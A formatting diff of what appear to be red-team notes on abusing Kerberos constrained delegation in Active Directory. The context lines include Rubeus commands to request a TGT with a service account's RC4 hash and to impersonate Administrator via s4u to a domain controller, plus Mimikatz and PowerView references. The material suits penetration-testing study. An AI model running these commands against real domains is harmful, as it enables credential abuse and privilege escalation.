@@ -53,11 +53,11 @@ description: Various attack prototypes for Constrained Delegation Abuse
 
 ## Basic Constrained Delegation Exploitation
 
-1. To perform the delegation, we ultimately need the TGT of the principal (machine or user) trusted for delegation.  We can extract it from a machine (Rubeus `dump`) or request one using the NTLM / AES keys (Mimikatz `sekurlsa::ekey`s + Rubeus `asktgt)`: 
+- To perform the delegation, we ultimately need the TGT of the principal (machine or user) trusted for delegation.  We can extract it from a machine (Rubeus `dump`) or request one using the NTLM / AES keys (Mimikatz `sekurlsa::ekey`s + Rubeus `asktgt)`: 
 ```
 .\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /rc4:2892......1211414
 ```
-2. Use `s4u2self` and `s4u2proxy` to impersonate the Target user delegated to the allowed SPN: 
+1. Use `s4u2self` and `s4u2proxy` to impersonate the Target user delegated to the allowed SPN: 
 ```
 .\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:cifs/dc /ptt
 ```
@@ -119,11 +119,10 @@ Get-DomainComputer -Identity TargetSrv | Set-DomainObject -Set @{'msds-allowedto
 -----------------------------------------------------
 
 # Resources
-
-1. https://courses.zeropointsecurity.co.uk/courses/red-team-ops
-2. https://www.pentesteracademy.com/activedirectorylab
-3. https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
-4. https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference
+-  https://courses.zeropointsecurity.co.uk/courses/red-team-ops
+-  https://www.pentesteracademy.com/activedirectorylab
+-  https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
+-  https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference
 
 
 
